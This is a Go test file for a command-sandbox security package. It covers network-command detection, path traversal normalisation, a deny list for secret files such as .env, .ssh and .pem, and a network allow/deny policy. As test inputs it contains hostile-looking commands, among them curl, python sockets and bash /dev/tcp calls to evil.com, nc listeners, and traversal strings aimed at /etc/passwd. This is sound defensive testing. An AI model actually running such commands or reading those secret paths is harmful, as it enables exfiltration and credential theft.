package security

import (
	"testing"
)

func TestLooksNetworkCmd(t *testing.T) {
	tests := []struct {
		name string
		path string
		arg  string
		want bool
	}{
		// Direct binary name matching
		{"curl", "curl", "curl https://evil.com", true},
		{"wget", "wget", "wget http://evil.com", true},
		{"ssh", "ssh", "ssh user@host", true},
		{"scp", "scp", "scp file user@host:/tmp", true},
		{"nc", "nc", "nc -l 4444", true},
		{"ncat", "ncat", "ncat -l 4444", true},
		{"telnet", "telnet", "telnet host 80", true},
		{"netcat", "netcat", "netcat host 80", true},
		{"nslookup", "nslookup", "nslookup evil.com", true},
		{"dig", "dig", "dig evil.com", true},
		{"host", "host", "host evil.com", true},
		{"rclone", "rclone", "rclone copy remote:path /tmp", true},
		{"rsync", "rsync", "rsync -avz user@host:/ /tmp", true},
		{"socat", "socat", "socat TCP-LISTEN:80,fork", true},

		// Wrapper stripping: "env curl" path → strip "env" → "curl"
		{"env curl", "env", "env curl https://evil.com", true},
		{"nice wget", "nice", "nice wget http://evil.com", true},
		{"sudo ssh", "sudo", "sudo ssh user@host", true},
		{"nohup nc", "nohup", "nohup nc -l 4444", true},

		// Script-based network access
		{"python socket", "python", "python -c 'import socket; socket.connect((\"evil.com\",80))'", true},
		{"python urllib", "python", "python -c 'import urllib.request; urllib.request.urlopen(\"http://evil.com\")'", true},
		{"python http", "python", "python -c 'import http.client; http.client.HTTPConnection(\"evil.com\")'", true},
		{"node require", "node", "node -e \"require('http').get('http://evil.com')\"", true},
		{"bash dev/tcp", "bash", "bash -c 'cat < /dev/tcp/evil.com/80'", true},

		// Negative cases: non-network commands
		{"echo", "echo", "echo hello world", false},
		{"cat", "cat", "cat file.txt", false},
		{"ls", "ls", "ls -la /tmp", false},
		{"grep", "grep", "grep pattern file.txt", false},
		{"git", "git", "git status", false},
		{"go", "go", "go build ./...", false},
		{"npm", "npm", "npm install", false},
		{"python no network", "python", "python -c 'print(1+1)'", false},
		{"node no network", "node", "node -e 'console.log(1)'", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := looksNetworkCmd(tt.path, tt.arg)
			if got != tt.want {
				t.Errorf("looksNetworkCmd(%q, %q) = %v, want %v", tt.path, tt.arg, got, tt.want)
			}
		})
	}
}

func TestIsUnderWorkspace(t *testing.T) {
	tests := []struct {
		name      string
		path      string
		workspace string
		want      bool
	}{
		{"subpath", "/workspace/src/main.go", "/workspace", true},
		{"exact match", "/workspace", "/workspace", true},
		{"dot dot escape", "/workspace/../etc/passwd", "/workspace", false},
		{"deep dot dot", "/workspace/a/b/../../c", "/workspace", true}, // resolves to /workspace/c
		{"absolute escape", "/etc/passwd", "/workspace", false},
		{"empty workspace", "/etc/passwd", "", true}, // empty workspace = allow all
		{"empty path", "", "/workspace", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isUnderWorkspace(tt.path, tt.workspace)
			if got != tt.want {
				t.Errorf("isUnderWorkspace(%q, %q) = %v, want %v", tt.path, tt.workspace, got, tt.want)
			}
		})
	}
}

func TestNormalizePathArg(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{"empty", "", ""},
		{"plain path", "src/main.go", "src/main.go"},
		{"url encoded dotdot", "%2e%2e/%2e%2e/etc/passwd", "../../etc/passwd"},
		{"double encoded", "%252e%252e/etc/passwd", "../etc/passwd"},
		{"unicode slash", "src\u2215main.go", "src/main.go"},
		{"fullwidth solidus", "src\uFF0Fmain.go", "src/main.go"},
		{"null byte stripped", "src/main\x00.go", "src/main.go"},
		{"control char stripped", "src/main\x01.go", "src/main.go"},
		{"trailing dot", "file.txt.", "file.txt"},
		{"collapsed double slash", "src//main", "src/main"},
		{"collapsed dot slash", "src/./main", "src/main"},
		{"percent encoded f", "%2fetc%2fpasswd", "/etc/passwd"},
		{"percent encoded c", "%5cetc%5cpasswd", "/etc/passwd"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := NormalizePathArg(tt.in)
			if got != tt.want {
				t.Errorf("NormalizePathArg(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

func TestPathVariants(t *testing.T) {
	variants := PathVariants("src/main.go")
	if len(variants) == 0 {
		t.Fatal("PathVariants returned empty")
	}
	// Should contain the original, normalized, and cleaned versions
	found := map[string]bool{}
	for _, v := range variants {
		found[v] = true
	}
	if !found["src/main.go"] {
		t.Error("PathVariants missing original")
	}
}

func TestMatchGlob(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		pattern string
		want    bool
	}{
		{"exact match", "src/main.go", "src/main.go", true},
		{"star wildcard", "src/main.go", "src/*.go", true},
		{"double star", "src/deep/nested/file.go", "**/*.go", true},
		{"double star at root", "file.pem", "**/*.pem", true},
		{"no match", "src/main.go", "src/*.txt", false},
		{"dot env", ".env.local", "**/.env*", true},
		{"pem file", "certs/server.pem", "**/*.pem", true},
		{"key file", "certs/server.key", "**/*.key", true},
		{"question mark", "src/a.go", "src/?.go", true},
		{"question mark no match", "src/ab.go", "src/?.go", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := matchGlob(tt.path, tt.pattern)
			if got != tt.want {
				t.Errorf("matchGlob(%q, %q) = %v, want %v", tt.path, tt.pattern, got, tt.want)
			}
		})
	}
}

func TestDenyEngineIsDenied(t *testing.T) {
	engine, err := NewDenyEngine(DenyConfig{
		ExactPaths:   []string{".env", ".ssh"},
		GlobPatterns: []string{"**/*.pem", "**/*.key", "**/.env*"},
	})
	if err != nil {
		t.Fatal(err)
	}
	tests := []struct {
		name string
		path string
		want bool
	}{
		{"env exact", ".env", true},
		{"ssh exact", ".ssh", true},
		{"pem glob", "certs/server.pem", true},
		{"key glob", "certs/server.key", true},
		{"env local glob", ".env.local", true},
		{"safe file", "src/main.go", false},
		{"safe dir", "src", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := engine.IsDenied(tt.path)
			if got != tt.want {
				t.Errorf("IsDenied(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}

func TestDenyEngineIsDeniedWithSymlinkAware(t *testing.T) {
	engine, _ := NewDenyEngine(DenyConfig{
		GlobPatterns: []string{"**/*.pem"},
	})
	// path is safe, but realPath (resolved symlink) points to denied location
	if !engine.IsDeniedWithSymlinkAware("link.pem", "certs/server.pem") {
		t.Error("expected denied via symlink-aware check")
	}
	// both safe
	if engine.IsDeniedWithSymlinkAware("link.txt", "safe/file.txt") {
		t.Error("expected not denied")
	}
}

func TestNetworkEnforcerCanConnect(t *testing.T) {
	e := NewNetworkEnforcer(NetworkPolicy{
		AllowSites: []string{"api.github.com", "*.npmjs.org"},
		DenySites:  []string{"evil.com"},
	})
	tests := []struct {
		host string
		port string
		want bool
	}{
		{"api.github.com", "443", true},
		{"registry.npmjs.org", "443", true},
		{"evil.com", "443", false},
		{"unknown.com", "443", false},
	}
	for _, tt := range tests {
		got, _ := e.CanConnect(tt.host, tt.port)
		if got != tt.want {
			t.Errorf("CanConnect(%q, %q) = %v, want %v", tt.host, tt.port, got, tt.want)
		}
	}
}

func TestNetworkEnforcerBlockAll(t *testing.T) {
	e := NewNetworkEnforcer(NetworkPolicy{BlockAll: true})
	got, reason := e.CanConnect("api.github.com", "443")
	if got {
		t.Error("expected blocked")
	}
	if reason == "" {
		t.Error("expected reason")
	}
}
